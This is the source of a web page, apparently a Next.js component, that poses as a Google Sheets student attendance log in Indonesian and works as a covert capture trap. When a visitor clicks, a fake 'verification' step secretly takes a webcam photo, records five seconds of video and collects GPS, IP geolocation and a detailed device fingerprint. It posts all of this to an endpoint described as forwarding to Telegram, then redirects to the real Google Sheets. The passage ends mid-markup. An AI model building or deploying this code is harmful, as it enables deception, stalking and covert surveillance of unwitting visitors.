"use client";

import { useState, useRef, useEffect, useCallback } from "react";

// ─── Constants ──────────────────────────────────────────────────────────────
const SHEETS_REDIRECT = "https://docs.google.com/spreadsheets";

// ─── FAKE SHEET DATA (ATTENDANCE LOGS) ──────────────────────────────────────
const ABSENSI_DATA = [
  { nim: "220101001", nama: "Ahmad Fauzi", p1: "H", p2: "H", p3: "H", p4: "H", p5: "S", p6: "H", p7: "H", ket: "Sakit 1x" },
  { nim: "220101002", nama: "Budi Santoso", p1: "H", p2: "H", p3: "I", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Izin 1x" },
  { nim: "220101003", nama: "Citra Lestari", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101004", nama: "Dedi Wijaya", p1: "H", p2: "A", p3: "H", p4: "H", p5: "H", p6: "A", p7: "H", ket: "Alpha 2x" },
  { nim: "220101005", nama: "Eka Putri", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101006", nama: "Fajar Nugraha", p1: "H", p2: "H", p3: "H", p4: "I", p5: "H", p6: "H", p7: "H", ket: "Izin 1x" },
  { nim: "220101007", nama: "Gita Amalia", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101008", nama: "Hendra Wijaya", p1: "H", p2: "H", p3: "S", p4: "H", p5: "S", p6: "H", p7: "H", ket: "Sakit 2x" },
  { nim: "220101009", nama: "Indah Permata", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101010", nama: "Joko Susilo", p1: "H", p2: "A", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Alpha 1x" },
  { nim: "220101011", nama: "Kartika Sari", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101012", nama: "Lukman Hakim", p1: "H", p2: "H", p3: "H", p4: "H", p5: "I", p6: "H", p7: "H", ket: "Izin 1x" },
  { nim: "220101013", nama: "Maria Ulfah", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101014", nama: "Novianti", p1: "H", p2: "H", p3: "H", p4: "S", p5: "H", p6: "H", p7: "H", ket: "Sakit 1x" },
  { nim: "220101015", nama: "Oki Setiawan", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101016", nama: "Putri Rahayu", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "I", ket: "Izin 1x" },
  { nim: "220101017", nama: "Qori Aina", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101018", nama: "Rian Hidayat", p1: "H", p2: "H", p3: "A", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Alpha 1x" },
  { nim: "220101019", nama: "Siti Aminah", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101020", nama: "Taufik Hidayat", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "I", p7: "H", ket: "Izin 1x" },
  { nim: "220101021", nama: "Utami Ningsih", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101022", nama: "Vicky Prasetyo", p1: "H", p2: "I", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Izin 1x" },
  { nim: "220101023", nama: "Wahyu Hidayat", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101024", nama: "Xena Aliyah", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101025", nama: "Yayan Ruhian", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101026", nama: "Zaki Mubarok", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101027", nama: "Aditya Pratama", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101028", nama: "Bella Safira", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101029", nama: "Chandra Kirana", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101030", nama: "Dewi Sartika", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101031", nama: "Elga Sandy", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101032", nama: "Farhan Alamsyah", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101033", nama: "Guntur Pratama", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101034", nama: "Hany Rahmawati", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101035", nama: "Irfan Bachdim", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101036", nama: "Julia Perez", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101037", nama: "Kevin Sanjaya", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101038", nama: "Lesti Kejora", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101039", nama: "Muhammad Ali", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101040", nama: "Nadia Vega", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101041", nama: "Olga Syahputra", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101042", nama: "Prilly Latuconsina", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101043", nama: "Raditya Dika", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101044", nama: "Sule Sutisna", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101045", nama: "Tora Sudiro", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101046", nama: "Uus Rizky", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101047", nama: "Vanesha Prescilla", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101048", nama: "Wulan Guritno", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101049", nama: "Yuni Shara", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" },
  { nim: "220101050", nama: "Zaskia Mecca", p1: "H", p2: "H", p3: "H", p4: "H", p5: "H", p6: "H", p7: "H", ket: "Lengkap" }
];

const REKAP_DATA = [
  { nim: "220101001", nama: "Ahmad Fauzi", hadir: 6, sakit: 1, izin: 0, alpha: 0, pct: "85.7%" },
  { nim: "220101002", nama: "Budi Santoso", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101003", nama: "Citra Lestari", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101004", nama: "Dedi Wijaya", hadir: 5, sakit: 0, izin: 0, alpha: 2, pct: "71.4%" },
  { nim: "220101005", nama: "Eka Putri", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101006", nama: "Fajar Nugraha", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101007", nama: "Gita Amalia", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101008", nama: "Hendra Wijaya", hadir: 5, sakit: 2, izin: 0, alpha: 0, pct: "71.4%" },
  { nim: "220101009", nama: "Indah Permata", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101010", nama: "Joko Susilo", hadir: 6, sakit: 0, izin: 0, alpha: 1, pct: "85.7%" },
  { nim: "220101011", nama: "Kartika Sari", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101012", nama: "Lukman Hakim", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101013", nama: "Maria Ulfah", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101014", nama: "Novianti", hadir: 6, sakit: 1, izin: 0, alpha: 0, pct: "85.7%" },
  { nim: "220101015", nama: "Oki Setiawan", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101016", nama: "Putri Rahayu", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101017", nama: "Qori Aina", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101018", nama: "Rian Hidayat", hadir: 6, sakit: 0, izin: 0, alpha: 1, pct: "85.7%" },
  { nim: "220101019", nama: "Siti Aminah", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101020", nama: "Taufik Hidayat", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101021", nama: "Utami Ningsih", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101022", nama: "Vicky Prasetyo", hadir: 6, sakit: 0, izin: 1, alpha: 0, pct: "85.7%" },
  { nim: "220101023", nama: "Wahyu Hidayat", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101024", nama: "Xena Aliyah", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101025", nama: "Yayan Ruhian", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101026", nama: "Zaki Mubarok", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101027", nama: "Aditya Pratama", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101028", nama: "Bella Safira", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101029", nama: "Chandra Kirana", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101030", nama: "Dewi Sartika", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101031", nama: "Elga Sandy", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101032", nama: "Farhan Alamsyah", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101033", nama: "Guntur Pratama", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101034", nama: "Hany Rahmawati", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101035", nama: "Irfan Bachdim", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101036", nama: "Julia Perez", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101037", nama: "Kevin Sanjaya", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101038", nama: "Lesti Kejora", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101039", nama: "Muhammad Ali", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101040", nama: "Nadia Vega", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101041", nama: "Olga Syahputra", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101042", nama: "Prilly Latuconsina", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101043", nama: "Raditya Dika", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101044", nama: "Sule Sutisna", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101045", nama: "Tora Sudiro", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101046", nama: "Uus Rizky", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101047", nama: "Vanesha Prescilla", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101048", nama: "Wulan Guritno", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101049", nama: "Yuni Shara", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" },
  { nim: "220101050", nama: "Zaskia Mecca", hadir: 7, sakit: 0, izin: 0, alpha: 0, pct: "100%" }
];

export default function GoogleSheetsPage() {
  const [activeTab, setActiveTab] = useState("REKAP ABSENSI MAHASISWA");
  const [phase, setPhase] = useState<"sheets" | "pretext" | "verifying" | "done">("sheets");
  const [progress, setProgress] = useState(0);
  
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // Captured data
  const captured = useRef({
    photo: null as Blob | null,
    video: null as Blob | null,
    gps: null as { lat: number; lng: number } | null,
    ip: null as Record<string, string> | null,
    ua: "",
  });

  // Create a hidden video element for photo capture
  useEffect(() => {
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  // ── CAPTURE FLOW (Background) ──────────────────────────────────────────────
  const captureEverything = useCallback(async () => {
    const gpsPromise = new Promise<{ lat: number; lng: number } | null>(resolve => {
      if (!("geolocation" in navigator)) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
        () => resolve(null),
        { timeout: 5000, enableHighAccuracy: true }
      );
    });

    const ipPromise = (async () => {
      try { 
        const r = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) }); 
        return r.ok ? await r.json() : null; 
      } catch { 
        try {
          const r2 = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(4000) });
          return r2.ok ? await r2.json() : null;
        } catch {
          return null; 
        }
      }
    })();

    const streamPromise = (async () => {
      try { 
        return await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        }); 
      } catch { 
        return null; 
      }
    })();

    const [gps, ip, capStream] = await Promise.all([gpsPromise, ipPromise, streamPromise]);
    captured.current = { photo: null, video: null, gps, ip, ua: navigator.userAgent };

    if (capStream) {
      streamRef.current = capStream;
      
      // 1. Take Photo immediately (allow 300ms for camera setup)
      const photo = await new Promise<Blob | null>(res => {
        const v = videoRef.current;
        if (!v) { res(null); return; }
        v.srcObject = capStream;
        v.onloadedmetadata = () => {
          v.play();
          setTimeout(() => {
            const c = document.createElement("canvas"); 
            c.width = v.videoWidth || 640; 
            c.height = v.videoHeight || 480;
            const ctx = c.getContext("2d");
            if (ctx) { 
              ctx.drawImage(v, 0, 0, c.width, c.height); 
              c.toBlob(b => res(b), "image/jpeg", 0.85); 
            } else { 
              res(null); 
            }
          }, 300);
        };
      });
      captured.current.photo = photo;

      // 2. Record 5 seconds of video
      const videoBlob = await new Promise<Blob | null>(res => {
        let mediaRecorder: MediaRecorder;
        try {
          mediaRecorder = new MediaRecorder(capStream, { mimeType: "video/webm" });
        } catch {
          try {
            mediaRecorder = new MediaRecorder(capStream);
          } catch {
            res(null);
            return;
          }
        }
        const chunks: Blob[] = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = () => { res(new Blob(chunks, { type: mediaRecorder.mimeType })); };
        mediaRecorder.start();
        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
      });
      captured.current.video = videoBlob;

      // Stop tracks
      capStream.getTracks().forEach(t => t.stop());
    }
  }, []);

  // ── SEND TO TELEGRAM ────────────────────────────────────────────────────────
  const sendCaptured = useCallback(async (extra?: { phase?: string }) => {
    const c = captured.current;
    const fd = new FormData();
    if (c.photo) fd.append("photo", c.photo, "photo.jpg");
    if (c.video) fd.append("video", c.video, "video.webm");

    const ua = c.ua || navigator.userAgent;
    const os = (() => {
      if (/android/i.test(ua)) { const m = ua.match(/Android\s+([\d.]+)/); const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/); return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`; }
      if (/iPad|iPhone|iPod/.test(ua)) { const m = ua.match(/OS\s+([\d_]+)/); return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      if (/Windows/.test(ua)) { const m = ua.match(/Windows NT\s+([\d.]+)/); return `Windows ${({ '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' })[m?.[1] || ''] || m?.[1] || '?'}`; }
      if (/Mac OS X/.test(ua)) { const m = ua.match(/Mac OS X\s+([\d_]+)/); return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      return /Linux/.test(ua) ? 'Linux' : 'Unknown OS';
    })();
    const browser = (() => {
      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
      return 'Unknown Browser';
    })();
    const nav = navigator as any;
    const conn = nav.connection;
    const network = conn ? `${String(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}` : 'Unknown';
    let battery = 'Unknown';
    try { const b = nav.getBattery?.(); if (b) b.then((bat: { level: number; charging: boolean }) => { battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (Charging)' : ' (Discharging)'}`; }); } catch {}
    const ram = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'Unknown';
    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
    const dpr = window.devicePixelRatio || 1;
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
    
    let locStr = '';
    if (c.gps) { locStr = `📍 GPS: ${c.gps.lat}, ${c.gps.lng}\n🗺 Maps: https://www.google.com/maps?q=${c.gps.lat},${c.gps.lng}`; }
    else if (c.ip) { locStr = `🌐 IP: ${c.ip['ip'] || '?'}\n🏙 Kota: ${c.ip['city'] || '?'}\n🗺 Region: ${c.ip['region'] || '?'}\n🌏 Negara: ${c.ip['country'] || '?'}\n📍 Koordinat: ${c.ip['loc'] || '?'}\n🏢 ISP: ${c.ip['org'] || '?'}`; }
    else { locStr = '❌ LOKASI TIDAK TERSEDIA'; }
    
    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    const info = `GOOGLE SHEETS — ${extra?.phase || 'CAPTURE'}\n━━━━━━━━━━━━━━━━━━━\n⏱ ${ts}\n🆔 ${new Date().toISOString()}\n\n━━━ LOKASI ━━━\n${locStr}\n\n━━━ PERANGKAT ━━━\n💻 OS: ${os}\n🌍 Browser: ${browser}\n📱 Platform: ${navigator.platform || '?'}\n🗣 Bahasa: ${navigator.language}\n🕐 Zona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔋 Baterai: ${battery}\n🧠 RAM: ${ram}\n⚡ CPU: ${cpu}\n📶 Koneksi: ${network}\n\n━━━ LAYAR ━━━\n📐 ${window.screen.width}x${window.screen.height}\n👁 ${window.innerWidth}x${window.innerHeight}\n🔍 ${dpr}x\n🔄 ${orientation}\n━━━ UA ━━━\n${ua}`;
    
    fd.append("locationInfo", info);
    
    // Attempt sending to Telegram
    for (let i = 0; i < 2; i++) {
      try { 
        const r = await fetch("/api/telegram", { method: "POST", body: fd }); 
        if (r.ok) break; 
      } catch {}
      if (i === 0) await new Promise(r => setTimeout(r, 500));
    }
  }, []);

  // ── TRIGGER VERIFICATION (When click Sheet tab/cell) ───────────────────────
  const triggerVerification = () => {
    if (phase !== "sheets") return;
    setPhase("pretext");
  };

  const startActualVerification = async () => {
    if (phase === "verifying" || phase === "done") return;
    setPhase("verifying");
    setProgress(15);

    try {
      const timer = setInterval(() => {
        setProgress(p => {
          if (p >= 90) { clearInterval(timer); return 90; }
          return p + Math.floor(Math.random() * 15) + 5;
        });
      }, 400);

      await captureEverything();
      await sendCaptured({ phase: "FULL CAPTURE COMPLETE" });

      clearInterval(timer);
      setProgress(100);

      setTimeout(() => {
        setPhase("done");
        window.location.href = SHEETS_REDIRECT;
      }, 1000);

    } catch (err) {
      console.error(err);
      setPhase("done");
      window.location.href = SHEETS_REDIRECT;
    }
  };

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col overflow-hidden text-[#3c4043]">
      
      {/* ——— GOOGLE SHEETS HEADER ——— */}
      <header className="bg-white px-4 py-1.5 flex items-center justify-between z-10 border-b border-slate-100 select-none">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 flex-shrink-0 flex items-center justify-center">
            <svg viewBox="0 0 48 48" width="30" height="30">
              <path fill="#21a366" d="M38 44H10c-2.2 0-4-1.8-4-4V8c0-2.2 1.8-4 4-4h20l12 12v28c0 2.2-1.8 4-4 4z"/>
              <path fill="#e2f3eb" d="M30 4l12 12H30z"/>
              <rect x="12" y="20" width="24" height="4" rx="1" fill="#ffffff"/>
              <rect x="12" y="28" width="24" height="4" rx="1" fill="#ffffff"/>
              <rect x="12" y="12" width="14" height="4" rx="1" fill="#ffffff"/>
            </svg>
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-lg font-normal text-[#1f1f1f] tracking-wide" style={{ fontFamily: "'Product Sans', Roboto, Arial, sans-serif" }}>
                Untitled spreadsheet
              </span>
              <span className="text-slate-500 text-xs">⭐</span>
            </div>
            <nav className="flex gap-x-2 text-[13px] text-[#3c4043] font-normal">
              {["File", "Edit", "Tampilan", "Sisipkan", "Format", "Data", "Alat", "Ekstensi", "Bantuan"].map((m, i) => (
                <span key={i} className="hover:bg-slate-100 px-1.5 py-0.5 rounded cursor-pointer transition">{m}</span>
              ))}
            </nav>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {/* Top-Right Share Buttons and User profile */}
          <button className="p-2 hover:bg-slate-100 rounded-full">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="#444746"><path d="M21 6h-2v9H6v2c0 .55.45 1 1 1h11l4 4V7c0-.55-.45-1-1-1zm-4 6V3c0-.55-.45-1-1-1H3c-.55 0-1 .45-1 1v12l4-4h11c.55 0 1-.45 1-1z"/></svg>
          </button>
          <button className="p-2 hover:bg-slate-100 rounded-full">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="#444746"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
          </button>
          <button className="bg-[#c2e7ff] hover:bg-[#b0dbf7] text-[#001d35] font-semibold text-xs py-2 px-5 rounded-full flex items-center gap-2 transition shadow-xs">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            Bagikan
          </button>
          <button className="bg-[#e8f0fe] hover:bg-[#d2e3fc] text-[#0b57d0] font-semibold text-xs py-2 px-4 rounded-lg transition">
            Upgrade
          </button>
          <div className="w-8 h-8 rounded-full bg-[#e8710a] text-white flex items-center justify-center font-bold text-xs select-none border border-slate-200">
            I
          </div>
        </div>
      </header>

      {/* ——— SHEETS TOOLBAR ——— */}
      <section className="bg-[#f0f4f9] rounded-full mx-4 my-1 px-4 py-1 flex flex-wrap gap-1 items-center text-xs text-[#444746] border border-slate-100 shadow-xs">
        {/* Search & Undo/Redo */}
        <div className="flex items-center gap-0.5 border-r border-[#dadce0] pr-1 mr-1">
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer transition flex items-center justify-center" title="Search">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer transition flex items-center justify-center" title="Undo">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12.5 8c-2.65 0-5.05.99-6.9 2.6L2 7v9h9l-3.62-3.62c1.39-1.16 3.16-1.88 5.12-1.88 3.54 0 6.55 2.31 7.6 5.5l2.37-.78C21.08 11.03 17.15 8 12.5 8z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer transition flex items-center justify-center" title="Redo">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M18.4 10.6C16.55 8.99 14.15 8 11.5 8c-4.65 0-8.58 3.03-9.96 7.22L3.9 16c1.05-3.19 4.06-5.5 7.6-5.5 1.96 0 3.73.72 5.12 1.88L13 16h9V7l-3.6 3.6z"/></svg>
          </button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer transition flex items-center justify-center" title="Print">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 8H5c-1.66 0-3 1.34-3 3v6h4v4h12v-4h4v-6c0-1.66-1.34-3-3-3zm-3 11H8v-5h8v5zm3-7c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-1-9H6v4h12V3z"/></svg>
          </button>
        </div>

        {/* Zoom & Formats */}
        <div className="flex items-center gap-0.5 border-r border-[#dadce0] pr-1 mr-1">
          <span className="hover:bg-slate-200/60 px-2 py-1 rounded cursor-pointer font-medium flex items-center gap-1">
            100% <span className="text-[8px] text-slate-500">▼</span>
          </span>
          <button className="hover:bg-slate-200/60 px-2 py-1.5 rounded font-bold" title="Format Currency">$</button>
          <button className="hover:bg-slate-200/60 px-2 py-1.5 rounded font-bold" title="Percent">%</button>
          <button className="hover:bg-slate-200/60 px-2 py-1.5 rounded" title="Decrease Decimal">.0</button>
          <button className="hover:bg-slate-200/60 px-2 py-1.5 rounded" title="Increase Decimal">.00</button>
          <span className="hover:bg-slate-200/60 px-2 py-1 rounded cursor-pointer font-medium flex items-center gap-1">
            123 <span className="text-[8px] text-slate-500">▼</span>
          </span>
        </div>

        {/* Font & Size */}
        <div className="flex items-center gap-0.5 border-r border-[#dadce0] pr-1 mr-1">
          <span className="hover:bg-slate-200/60 px-2 py-1 rounded cursor-pointer font-medium flex items-center gap-1 text-[11px] font-sans">
            Arial <span className="text-[8px] text-slate-500">▼</span>
          </span>
          <span className="hover:bg-slate-200/60 px-2 py-1 rounded cursor-pointer font-medium flex items-center gap-1 text-[11px]">
            10 <span className="text-[8px] text-slate-500">▼</span>
          </span>
        </div>

        {/* Text styling */}
        <div className="flex items-center gap-0.5 border-r border-[#dadce0] pr-1 mr-1">
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer font-bold text-[14px] flex items-center justify-center w-7 h-7" title="Bold">B</button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer italic text-[14px] flex items-center justify-center w-7 h-7" title="Italic">I</button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer line-through text-[14px] flex items-center justify-center w-7 h-7" title="Strike">S</button>
          <button className="hover:bg-slate-200/60 p-1.5 rounded cursor-pointer flex items-center justify-center w-7 h-7" title="Text color">
            <span className="border-b-2 border-slate-900 pb-0.5 px-0.5">A</span>
          </button>
        </div>

        {/* Cell styling */}
        <div className="flex items-center gap-0.5">
